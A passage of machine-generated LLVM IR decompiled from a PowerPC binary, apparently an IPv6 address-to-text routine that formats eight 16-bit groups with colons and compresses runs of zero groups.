  store i32 ptrtoint (i32* @global_var_1000c088.336 to i32), i32* @lr, align 4
  %v3_1000c084 = call i32 @function_10006e24(i32 %v2_1000c074, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c0b815 = load i32, i32* @r27, align 4
  store i32 %v0_1000c0b815, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c098

dec_label_pc_1000c098:                            ; preds = %dec_label_pc_1000c098.lr.ph, %dec_label_pc_1000c098
  %v1_1000c0ac = phi i32 [ 0, %dec_label_pc_1000c098.lr.ph ], [ %v1_1000c0bc, %dec_label_pc_1000c098 ]
  %v0_1000c098 = phi i32 [ %v0_1000c0b815, %dec_label_pc_1000c098.lr.ph ], [ %v0_1000c0b8, %dec_label_pc_1000c098 ]
  %v0_1000c0a0 = phi i32 [ %v0_1000c0b815, %dec_label_pc_1000c098.lr.ph ], [ %v2_1000c0b8, %dec_label_pc_1000c098 ]
  %v1_1000c098 = phi i32 [ 0, %dec_label_pc_1000c098.lr.ph ], [ %v0_1000c0b0, %dec_label_pc_1000c098 ]
  %v2_1000c098 = add i32 %v0_1000c098, %v1_1000c098
  %v3_1000c098 = inttoptr i32 %v2_1000c098 to i8*
  %v4_1000c098 = load i8, i8* %v3_1000c098, align 1
  %v5_1000c098 = zext i8 %v4_1000c098 to i32
  %v1_1000c09c = add i32 %v1_1000c098, 2
  store i32 %v1_1000c09c, i32* %r11.global-to-local, align 4
  %v1_1000c0a0 = add i32 %v0_1000c0a0, 1
  %v2_1000c0a0 = inttoptr i32 %v1_1000c0a0 to i8*
  %v3_1000c0a0 = load i8, i8* %v2_1000c0a0, align 1
  %v4_1000c0a0 = zext i8 %v3_1000c0a0 to i32
  %v1_1000c0a4 = mul nuw nsw i32 %v5_1000c098, 256
  %v2_1000c0a8 = or i32 %v4_1000c0a0, %v1_1000c0a4
  %v2_1000c0ac = load i32, i32* %r29.global-to-local, align 4
  %v3_1000c0ac = add i32 %v2_1000c0ac, %v1_1000c0ac
  %v4_1000c0ac = inttoptr i32 %v3_1000c0ac to i32*
  store i32 %v2_1000c0a8, i32* %v4_1000c0ac, align 4
  %v0_1000c0b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c0b0 = udiv i32 %v0_1000c0b0, 2
  %v0_1000c0b8 = load i32, i32* @r27, align 4
  %v2_1000c0b8 = add i32 %v0_1000c0b8, %v0_1000c0b0
  store i32 %v2_1000c0b8, i32* %r9.global-to-local, align 4
  %v1_1000c0bc = mul i32 %v1_1000c0b0, 4
  %v0_1000c0c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c0c0 = add i32 %v0_1000c0c0, -1
  store i32 %v1_1000c0c0, i32* %ctr.global-to-local, align 4
  %v2_1000c0c0 = icmp eq i32 %v1_1000c0c0, 0
  br i1 %v2_1000c0c0, label %dec_label_pc_1000c0e0.lr.ph, label %dec_label_pc_1000c098

dec_label_pc_1000c0e0.lr.ph:                      ; preds = %dec_label_pc_1000c098
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c0e0

dec_label_pc_1000c0e0:                            ; preds = %dec_label_pc_1000c0e0.lr.ph, %dec_label_pc_1000c12c
  %v0_1000c130 = phi i32 [ 8, %dec_label_pc_1000c0e0.lr.ph ], [ %v1_1000c130, %dec_label_pc_1000c12c ]
  %v0_1000c120 = phi i32 [ -1, %dec_label_pc_1000c0e0.lr.ph ], [ %v0_1000c12042, %dec_label_pc_1000c12c ]
  %v0_1000c110 = phi i32 [ -1, %dec_label_pc_1000c0e0.lr.ph ], [ %v0_1000c11039, %dec_label_pc_1000c12c ]
  %v0_1000c0e4 = phi i32 [ -1, %dec_label_pc_1000c0e0.lr.ph ], [ %v0_1000c0e435, %dec_label_pc_1000c12c ]
  %v0_1000c12c = phi i32 [ 0, %dec_label_pc_1000c0e0.lr.ph ], [ %v1_1000c12c, %dec_label_pc_1000c12c ]
  %v1_1000c0e0 = mul i32 %v0_1000c12c, 4
  %v3_1000c0e4 = icmp eq i32 %v0_1000c0e4, -1
  %v2_1000c0e8 = add i32 %v1_1000c0e0, %v2_1000c074
  %v3_1000c0e8 = inttoptr i32 %v2_1000c0e8 to i32*
  %v4_1000c0e8 = load i32, i32* %v3_1000c0e8, align 4
  %v3_1000c0ec = icmp eq i32 %v4_1000c0e8, 0
  br i1 %v3_1000c0ec, label %dec_label_pc_1000c0f4, label %dec_label_pc_1000c10c

dec_label_pc_1000c0f4:                            ; preds = %dec_label_pc_1000c0e0
  br i1 %v3_1000c0e4, label %dec_label_pc_1000c0f8, label %dec_label_pc_1000c104

dec_label_pc_1000c0f8:                            ; preds = %dec_label_pc_1000c0f4
  store i32 %v0_1000c12c, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000c12c

dec_label_pc_1000c104:                            ; preds = %dec_label_pc_1000c0f4
  %v0_1000c104 = load i32, i32* @r31, align 4
  %v1_1000c104 = add i32 %v0_1000c104, 1
  store i32 %v1_1000c104, i32* @r31, align 4
  br label %dec_label_pc_1000c12c

dec_label_pc_1000c10c:                            ; preds = %dec_label_pc_1000c0e0
  br i1 %v3_1000c0e4, label %dec_label_pc_1000c12c, label %dec_label_pc_1000c110

dec_label_pc_1000c110:                            ; preds = %dec_label_pc_1000c10c
  %v3_1000c110 = icmp eq i32 %v0_1000c110, -1
  %v0_1000c124.pre = load i32, i32* @r31, align 4
  %v1_1000c118 = load i32, i32* @r30, align 4
  %v3_1000c118 = icmp sgt i32 %v0_1000c124.pre, %v1_1000c118
  %or.cond = or i1 %v3_1000c110, %v3_1000c118
  br i1 %or.cond, label %dec_label_pc_1000c120, label %dec_label_pc_1000c128

dec_label_pc_1000c120:                            ; preds = %dec_label_pc_1000c110
  store i32 %v0_1000c120, i32* @r28, align 4
  store i32 %v0_1000c124.pre, i32* @r30, align 4
  br label %dec_label_pc_1000c128

dec_label_pc_1000c128:                            ; preds = %dec_label_pc_1000c110, %dec_label_pc_1000c120
  %v0_1000c11040 = phi i32 [ %v0_1000c120, %dec_label_pc_1000c120 ], [ %v0_1000c110, %dec_label_pc_1000c110 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c12c

dec_label_pc_1000c12c:                            ; preds = %dec_label_pc_1000c10c, %dec_label_pc_1000c104, %dec_label_pc_1000c0f8, %dec_label_pc_1000c128
  %v0_1000c12042 = phi i32 [ %v0_1000c120, %dec_label_pc_1000c10c ], [ %v0_1000c120, %dec_label_pc_1000c104 ], [ %v0_1000c12c, %dec_label_pc_1000c0f8 ], [ -1, %dec_label_pc_1000c128 ]
  %v0_1000c0e435 = phi i32 [ -1, %dec_label_pc_1000c10c ], [ %v0_1000c0e4, %dec_label_pc_1000c104 ], [ %v0_1000c12c, %dec_label_pc_1000c0f8 ], [ -1, %dec_label_pc_1000c128 ]
  %v0_1000c11039 = phi i32 [ %v0_1000c110, %dec_label_pc_1000c10c ], [ %v0_1000c110, %dec_label_pc_1000c104 ], [ %v0_1000c110, %dec_label_pc_1000c0f8 ], [ %v0_1000c11040, %dec_label_pc_1000c128 ]
  %v1_1000c12c = add nuw nsw i32 %v0_1000c12c, 1
  store i32 %v1_1000c12c, i32* %r11.global-to-local, align 4
  %v1_1000c130 = add nsw i32 %v0_1000c130, -1
  store i32 %v1_1000c130, i32* %ctr.global-to-local, align 4
  %v2_1000c130 = icmp eq i32 %v1_1000c130, 0
  br i1 %v2_1000c130, label %dec_label_pc_1000c134, label %dec_label_pc_1000c0e0

dec_label_pc_1000c134:                            ; preds = %dec_label_pc_1000c12c
  %v3_1000c134 = icmp eq i32 %v0_1000c12042, -1
  %v1_1000c154 = icmp slt i32 %v0_1000c11039, -1
  %v3_1000c154 = icmp eq i32 %v0_1000c11039, -1
  store i1 %v1_1000c154, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c154, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c134, label %dec_label_pc_1000c154, label %dec_label_pc_1000c13c

dec_label_pc_1000c13c:                            ; preds = %dec_label_pc_1000c134
  %v0_1000c14c.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c154, label %dec_label_pc_1000c14c, label %dec_label_pc_1000c144

dec_label_pc_1000c144:                            ; preds = %dec_label_pc_1000c13c
  %v1_1000c144 = load i32, i32* @r30, align 4
  %v2_1000c144 = icmp slt i32 %v0_1000c14c.pre, %v1_1000c144
  %v3_1000c144 = icmp sgt i32 %v0_1000c14c.pre, %v1_1000c144
  %v4_1000c144 = icmp eq i32 %v0_1000c14c.pre, %v1_1000c144
  store i1 %v2_1000c144, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c144, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c144, label %dec_label_pc_1000c14c, label %dec_label_pc_1000c154.thread

dec_label_pc_1000c14c:                            ; preds = %dec_label_pc_1000c13c, %dec_label_pc_1000c144
  store i32 %v0_1000c14c.pre, i32* @r30, align 4
  store i32 %v0_1000c12042, i32* @r28, align 4
  br label %dec_label_pc_1000c154.thread

dec_label_pc_1000c154.thread:                     ; preds = %dec_label_pc_1000c14c, %dec_label_pc_1000c144
  %v0_1000c15c76 = phi i32 [ %v1_1000c144, %dec_label_pc_1000c144 ], [ %v0_1000c14c.pre, %dec_label_pc_1000c14c ]
  %v0_1000c154.ph = phi i32 [ %v0_1000c11039, %dec_label_pc_1000c144 ], [ %v0_1000c12042, %dec_label_pc_1000c14c ]
  %v1_1000c15459 = icmp slt i32 %v0_1000c154.ph, -1
  %v3_1000c15461 = icmp eq i32 %v0_1000c154.ph, -1
  store i1 %v1_1000c15459, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c15461, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c15c

dec_label_pc_1000c154:                            ; preds = %dec_label_pc_1000c134
  br i1 %v3_1000c154, label %dec_label_pc_1000c168, label %dec_label_pc_1000c154.dec_label_pc_1000c15c_crit_edge

dec_label_pc_1000c154.dec_label_pc_1000c15c_crit_edge: ; preds = %dec_label_pc_1000c154
  %v0_1000c15c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c15c

dec_label_pc_1000c15c:                            ; preds = %dec_label_pc_1000c154.dec_label_pc_1000c15c_crit_edge, %dec_label_pc_1000c154.thread
  %v0_1000c15c = phi i32 [ %v0_1000c15c76, %dec_label_pc_1000c154.thread ], [ %v0_1000c15c.pre, %dec_label_pc_1000c154.dec_label_pc_1000c15c_crit_edge ]
  %v0_1000c15462 = phi i32 [ %v0_1000c154.ph, %dec_label_pc_1000c154.thread ], [ %v0_1000c11039, %dec_label_pc_1000c154.dec_label_pc_1000c15c_crit_edge ]
  %v1_1000c15c = icmp slt i32 %v0_1000c15c, 1
  %v2_1000c15c = icmp sgt i32 %v0_1000c15c, 1
  %v3_1000c15c = icmp eq i32 %v0_1000c15c, 1
  store i1 %v1_1000c15c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c15c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c15c, label %dec_label_pc_1000c168, label %dec_label_pc_1000c164

dec_label_pc_1000c164:                            ; preds = %dec_label_pc_1000c15c
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000c168

dec_label_pc_1000c168:                            ; preds = %dec_label_pc_1000c15c, %dec_label_pc_1000c154, %dec_label_pc_1000c164
  %v0_1000c1743 = phi i32 [ %v0_1000c15462, %dec_label_pc_1000c15c ], [ -1, %dec_label_pc_1000c154 ], [ -1, %dec_label_pc_1000c164 ]
  %v2_1000c168 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000c168, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000c1744 = icmp slt i32 %v0_1000c1743, -1
  %v3_1000c1746 = icmp eq i32 %v0_1000c1743, -1
  store i1 %v1_1000c1744, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1746, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c1e4 = icmp slt i32 %tmp, 65535
  %v4_1000c1e4 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000c174

dec_label_pc_1000c174:                            ; preds = %dec_label_pc_1000c168, %dec_label_pc_1000c240
  %v2_1000c1b0 = phi i32 [ %v2_1000c168, %dec_label_pc_1000c168 ], [ %v2_1000c19851, %dec_label_pc_1000c240 ]
  %v0_1000c184 = phi i32 [ %v0_1000c1743, %dec_label_pc_1000c168 ], [ %v0_1000c174, %dec_label_pc_1000c240 ]
  %v0_1000c1a4 = phi i32 [ 0, %dec_label_pc_1000c168 ], [ %v1_1000c240, %dec_label_pc_1000c240 ]
  %v3_1000c1747 = phi i1 [ %v3_1000c1746, %dec_label_pc_1000c168 ], [ %v3_1000c174, %dec_label_pc_1000c240 ]
  br i1 %v3_1000c1747, label %dec_label_pc_1000c1a4, label %dec_label_pc_1000c17c

dec_label_pc_1000c17c:                            ; preds = %dec_label_pc_1000c174
  %v2_1000c17c = icmp slt i32 %v0_1000c1a4, %v0_1000c184
  %v4_1000c17c = icmp eq i32 %v0_1000c1a4, %v0_1000c184
  br i1 %v2_1000c17c, label %dec_label_pc_1000c1a4, label %dec_label_pc_1000c184

dec_label_pc_1000c184:                            ; preds = %dec_label_pc_1000c17c
  %v1_1000c184 = load i32, i32* @r30, align 4
  %v2_1000c184 = add i32 %v1_1000c184, %v0_1000c184
  %v2_1000c188 = icmp slt i32 %v0_1000c1a4, %v2_1000c184
  %v4_1000c188 = icmp eq i32 %v0_1000c1a4, %v2_1000c184
  store i1 %v2_1000c188, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c188, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c188, label %dec_label_pc_1000c190, label %dec_label_pc_1000c1a4

dec_label_pc_1000c190:                            ; preds = %dec_label_pc_1000c184
  br i1 %v4_1000c17c, label %dec_label_pc_1000c194, label %dec_label_pc_1000c240

dec_label_pc_1000c194:                            ; preds = %dec_label_pc_1000c190
  %v3_1000c198 = inttoptr i32 %v2_1000c1b0 to i8*
  store i8 58, i8* %v3_1000c198, align 1
  %v0_1000c19c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c19c = add i32 %v0_1000c19c, 1
  store i32 %v1_1000c19c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c240

dec_label_pc_1000c1a4:                            ; preds = %dec_label_pc_1000c184, %dec_label_pc_1000c17c, %dec_label_pc_1000c174
  %v1_1000c1a4 = icmp slt i32 %v0_1000c1a4, 0
  %v3_1000c1a4 = icmp eq i32 %v0_1000c1a4, 0
  store i1 %v1_1000c1a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1a4, label %dec_label_pc_1000c1b8.thread, label %dec_label_pc_1000c1b8

dec_label_pc_1000c1b8.thread:                     ; preds = %dec_label_pc_1000c1a4
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c21c

dec_label_pc_1000c1b8:                            ; preds = %dec_label_pc_1000c1a4
  %v3_1000c1b0 = inttoptr i32 %v2_1000c1b0 to i8*
  store i8 58, i8* %v3_1000c1b0, align 1
  %v0_1000c1b4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c1b4 = add i32 %v0_1000c1b4, 1
  store i32 %v1_1000c1b4, i32* %r29.global-to-local, align 4
  %v0_1000c1b8.pre = load i32, i32* @r31, align 4
  %v1_1000c1b8 = icmp slt i32 %v0_1000c1b8.pre, 6
  %v3_1000c1b8 = icmp eq i32 %v0_1000c1b8.pre, 6
  store i1 %v1_1000c1b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1b8, label %dec_label_pc_1000c1c0, label %dec_label_pc_1000c21c

dec_label_pc_1000c1c0:                            ; preds = %dec_label_pc_1000c1b8
  %v0_1000c1c0 = load i32, i32* @r28, align 4
  %v1_1000c1c0 = icmp slt i32 %v0_1000c1c0, 0
  %v3_1000c1c0 = icmp eq i32 %v0_1000c1c0, 0
  store i1 %v1_1000c1c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1c0, label %dec_label_pc_1000c1c8, label %dec_label_pc_1000c21c

dec_label_pc_1000c1c8:                            ; preds = %dec_label_pc_1000c1c0
  %v0_1000c1c8 = load i32, i32* @r30, align 4
  %v1_1000c1c8 = icmp slt i32 %v0_1000c1c8, 6
  %v3_1000c1c8 = icmp eq i32 %v0_1000c1c8, 6
  store i1 %v1_1000c1c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1c8, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c1d0

dec_label_pc_1000c1d0:                            ; preds = %dec_label_pc_1000c1c8
  %v1_1000c1d0 = icmp slt i32 %v0_1000c1c8, 5
  %v3_1000c1d0 = icmp eq i32 %v0_1000c1c8, 5
  store i1 %v1_1000c1d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c1d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c1d0, label %dec_label_pc_1000c1d8, label %dec_label_pc_1000c21c

dec_label_pc_1000c1d8:                            ; preds = %dec_label_pc_1000c1d0
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000c1e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c1e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000c1e4, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000c21c

dec_label_pc_1000c1ec:                            ; preds = %dec_label_pc_1000c1d8, %dec_label_pc_1000c1c8
  %v1_1000c1ec = load i32, i32* @r1, align 4
  %v2_1000c1ec = sub i32 %v1_1000c1ec, %v1_1000c1b4
  %v0_1000c1f0 = load i32, i32* @r27, align 4
  %v1_1000c1f0 = add i32 %v0_1000c1f0, 12
  %v1_1000c1f4 = add i32 %v2_1000c1ec, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000c200.337 to i32), i32* @lr, align 4
  %v3_1000c1fc = call i32 @function_1000bed0(i32 %v1_1000c1f0, i32 %v1_1000c1b4, i32 %v1_1000c1f4)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000c204 = icmp slt i32 %v3_1000c1fc, 0
  %v3_1000c204 = icmp eq i32 %v3_1000c1fc, 0
  store i1 %v1_1000c204, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c204, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c204, label %dec_label_pc_1000c2bc, label %dec_label_pc_1000c20c

dec_label_pc_1000c20c:                            ; preds = %dec_label_pc_1000c1ec
  %v0_1000c20c = load i32, i32* @r29, align 4
  store i32 %v0_1000c20c, i32* @r3, align 4
  %v0_1000c210 = call i32 @function_10006ed4()
  %v0_1000c214 = load i32, i32* @r29, align 4
  %v2_1000c214 = add i32 %v0_1000c214, %v0_1000c210
  store i32 %v2_1000c214, i32* %r29.global-to-local, align 4
  %v0_1000c254.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c254

dec_label_pc_1000c21c:                            ; preds = %dec_label_pc_1000c1b8.thread, %dec_label_pc_1000c1d8, %dec_label_pc_1000c1d0, %dec_label_pc_1000c1c0, %dec_label_pc_1000c1b8
  %v0_1000c21c67 = phi i32 [ 0, %dec_label_pc_1000c1b8.thread ], [ 6, %dec_label_pc_1000c1d8 ], [ 6, %dec_label_pc_1000c1d0 ], [ 6, %dec_label_pc_1000c1c0 ], [ %v0_1000c1b8.pre, %dec_label_pc_1000c1b8 ]
  %v0_1000c1f866 = phi i32 [ %v2_1000c1b0, %dec_label_pc_1000c1b8.thread ], [ %v1_1000c1b4, %dec_label_pc_1000c1d8 ], [ %v1_1000c1b4, %dec_label_pc_1000c1d0 ], [ %v1_1000c1b4, %dec_label_pc_1000c1c0 ], [ %v1_1000c1b4, %dec_label_pc_1000c1b8 ]
  %v1_1000c21c = mul i32 %v0_1000c21c67, 4
  store i32 %v2_1000c074, i32* %r9.global-to-local, align 4
  %v2_1000c224 = add i32 %v1_1000c21c, %v2_1000c074
  %v3_1000c224 = inttoptr i32 %v2_1000c224 to i32*
  %v4_1000c224 = load i32, i32* %v3_1000c224, align 4
  store i32 %v0_1000c1f866, i32* @r3, align 4
  store i32 268485180, i32* @lr, align 4
  %v5_1000c238 = call i32 @function_10004cbc(i32 %v0_1000c1f866, i32 ptrtoint ([3 x i8]* @global_var_1000f3ac.338 to i32), i32 %v4_1000c224, i32 %v2_1000c074)
  %v0_1000c23c = load i32, i32* @r29, align 4
  %v2_1000c23c = add i32 %v0_1000c23c, %v5_1000c238
  store i32 %v2_1000c23c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c240

dec_label_pc_1000c240:                            ; preds = %dec_label_pc_1000c190, %dec_label_pc_1000c194, %dec_label_pc_1000c21c
  %v2_1000c19851 = phi i32 [ %v2_1000c1b0, %dec_label_pc_1000c190 ], [ %v1_1000c19c, %dec_label_pc_1000c194 ], [ %v2_1000c23c, %dec_label_pc_1000c21c ]
  %v0_1000c240 = load i32, i32* @r31, align 4
  %v1_1000c240 = add i32 %v0_1000c240, 1
  store i32 %v1_1000c240, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000c240, 8
  %v0_1000c174 = load i32, i32* @r28, align 4
  %v1_1000c174 = icmp slt i32 %v0_1000c174, -1
  %v3_1000c174 = icmp eq i32 %v0_1000c174, -1
  store i1 %v1_1000c174, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c174, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000c174, label %dec_label_pc_1000c24c

dec_label_pc_1000c24c:                            ; preds = %dec_label_pc_1000c240
  br i1 %v3_1000c174, label %dec_label_pc_1000c26c, label %dec_label_pc_1000c254

dec_label_pc_1000c254:                            ; preds = %dec_label_pc_1000c24c, %dec_label_pc_1000c20c
  %v2_1000c264 = phi i32 [ %v2_1000c19851, %dec_label_pc_1000c24c ], [ %v2_1000c214, %dec_label_pc_1000c20c ]
  %v0_1000c254 = phi i32 [ %v0_1000c174, %dec_label_pc_1000c24c ], [ %v0_1000c254.pre, %dec_label_pc_1000c20c ]
  %v1_1000c254 = load i32, i32* @r30, align 4
  %v2_1000c254 = add i32 %v1_1000c254, %v0_1000c254
  %v1_1000c258 = icmp slt i32 %v2_1000c254, 8
  %v3_1000c258 = icmp eq i32 %v2_1000c254, 8
  store i1 %v1_1000c258, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c258, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c258, label %dec_label_pc_1000c260, label %dec_label_pc_1000c26c

dec_label_pc_1000c260:                            ; preds = %dec_label_pc_1000c254
  %v3_1000c264 = inttoptr i32 %v2_1000c264 to i8*
  store i8 58, i8* %v3_1000c264, align 1
  %v0_1000c268 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c268 = add i32 %v0_1000c268, 1
  store i32 %v1_1000c268, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c26c

dec_label_pc_1000c26c:                            ; preds = %dec_label_pc_1000c254, %dec_label_pc_1000c24c, %dec_label_pc_1000c260
  %v2_1000c280 = phi i32 [ %v2_1000c264, %dec_label_pc_1000c254 ], [ %v2_1000c19851, %dec_label_pc_1000c24c ], [ %v1_1000c268, %dec_label_pc_1000c260 ]
  %v1_1000c26c = sub i32 1, %v2_1000c168
  %v2_1000c274 = add i32 %v1_1000c26c, %v2_1000c280
  %v1_1000c278 = load i32, i32* @r26, align 4
  %v2_1000c278 = icmp ult i32 %v2_1000c274, %v1_1000c278
  %v4_1000c278 = icmp eq i32 %v2_1000c274, %v1_1000c278
  store i1 %v2_1000c278, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c278, i1* %cr7_eq.global-to-local, align 1
  %v3_1000c280 = inttoptr i32 %v2_1000c280 to i8*
  store i8 0, i8* %v3_1000c280, align 1
  %v0_1000c284 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c284 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000c284 = or i1 %v0_1000c284, %v1_1000c284
  br i1 %v2_1000c284, label %dec_label_pc_1000c29c, label %dec_label_pc_1000c288

dec_label_pc_1000c288:                            ; preds = %dec_label_pc_1000c26c
  %v0_1000c288 = call i32 @function_10004b48()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c294 = inttoptr i32 %v0_1000c288 to i32*
  store i32 28, i32* %v2_1000c294, align 4
  %v0_1000c2c0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2bc

dec_label_pc_1000c29c:                            ; preds = %dec_label_pc_1000c26c
  %v0_1000c29c = load i32, i32* @r25, align 4
  %v2_1000c2a0 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000c2a0 = call i32 @function_10006eb4(i32 %v0_1000c29c, i8* %v2_1000c2a0)
  br label %dec_label_pc_1000c2a4

dec_label_pc_1000c2a4:                            ; preds = %dec_label_pc_1000c060, %dec_label_pc_1000c29c
  %storemerge1 = phi i32 [ %v3_1000c06c, %dec_label_pc_1000c060 ], [ %v3_1000c2a0, %dec_label_pc_1000c29c ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2bc

dec_label_pc_1000c2ac:                            ; preds = %dec_label_pc_1000c054
  %v0_1000c2ac = call i32 @function_10004b48()
  %v2_1000c2b4 = inttoptr i32 %v0_1000c2ac to i32*
  store i32 97, i32* %v2_1000c2b4, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2bc

dec_label_pc_1000c2bc:                            ; preds = %dec_label_pc_1000c1ec, %dec_label_pc_1000c2a4, %dec_label_pc_1000c288, %dec_label_pc_1000c2ac
  %v0_1000c2c0 = phi i32 [ 0, %dec_label_pc_1000c1ec ], [ %storemerge1, %dec_label_pc_1000c2a4 ], [ %v0_1000c2c0.pre, %dec_label_pc_1000c288 ], [ 0, %dec_label_pc_1000c2ac ]
  ret i32 %v0_1000c2c0

; uselistorder directives
  uselistorder i32 %v2_1000c280, { 1, 0 }
  uselistorder i32 %v2_1000c254, { 1, 0 }
  uselistorder i1 %v3_1000c174, { 0, 2, 1 }
  uselistorder i32 %v0_1000c174, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000c240, { 2, 1, 0 }
  uselistorder i32 %v0_1000c1f866, { 1, 0 }
  uselistorder i32 %v3_1000c1fc, { 1, 0 }
  uselistorder i32 %v0_1000c1c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000c1b8.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000c1b4, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000c184, { 1, 0 }
  uselistorder i32 %v0_1000c1a4, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000c184, { 0, 2, 1 }
  uselistorder i32 %v2_1000c1b0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000c1743, { 0, 2, 1 }
  uselistorder i32 %v0_1000c15c, { 2, 1, 0 }
  uselistorder i32 %v0_1000c14c.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000c154, { 1, 0, 2 }
  uselistorder i32 %v1_1000c130, { 2, 1, 0 }
  uselistorder i32 %v1_1000c12c, { 1, 0 }
  uselistorder i32 %v0_1000c11039, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000c12042, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000c0e4, { 1, 0 }
  uselistorder i32 %v0_1000c12c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000c0e4, { 1, 0 }
  uselistorder i32 %v0_1000c110, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000c120, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000c0c0, { 1, 0 }
  uselistorder i32 %v2_1000c0b8, { 1, 0 }
  uselistorder i32 %v0_1000c0b0, { 1, 0, 2 }
  uselistorder i32 %v1_1000c098, { 1, 0 }
  uselistorder i32 %v2_1000c074, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 (i32, i8*)* @function_10006eb4, { 0, 1, 4, 5, 6, 7, 2, 3, 8, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 5, 0, 6, 10, 11, 7, 8, 9, 12 }
  uselistorder i1 true, { 2, 3, 5, 4, 0, 1 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 2, 1, 0 }
